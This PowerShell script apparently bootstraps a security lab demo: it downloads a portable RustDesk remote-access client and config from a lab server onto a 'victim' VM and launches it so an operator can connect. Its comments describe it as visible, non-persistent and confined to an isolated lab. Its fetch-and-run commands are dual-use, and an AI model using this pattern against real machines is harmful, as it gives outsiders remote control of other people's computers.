# Hackoween 2026 — lab demo bootstrap (user-level, NO admin, NO install, NO service).
# Runs on the isolated lab victim VM only. Pulls the portable RustDesk client and a
# per-user config from the lab web server (10.13.37.5) and launches it as the current
# user. Window is left VISIBLE on purpose — the audience should watch it happen.
#
# This is a demonstration artifact for an isolated, authorized lab. It talks only to
# the lab rendezvous server; it makes no attempt to hide, persist, or elevate.

$ErrorActionPreference = 'Stop'
$server = '10.13.37.5'

# 1. User-writable locations only (no Program Files, no service, no elevation).
$cfgDir = Join-Path $env:APPDATA 'RustDesk\config'
New-Item -ItemType Directory -Force -Path $cfgDir | Out-Null
$exe = Join-Path $env:TEMP 'rustdesk.exe'

# 2. Fetch the portable client + per-user config from the lab web server.
Invoke-WebRequest "http://$server/rustdesk.exe"   -OutFile $exe -UseBasicParsing
Invoke-WebRequest "http://$server/RustDesk2.toml"  -OutFile (Join-Path $cfgDir 'RustDesk2.toml') -UseBasicParsing

# 3. Launch as the current user. The client shows its ID + one-time password in the
#    window; the demo operator reads those off-screen (or from the hbbs log) to connect.
Start-Process $exe
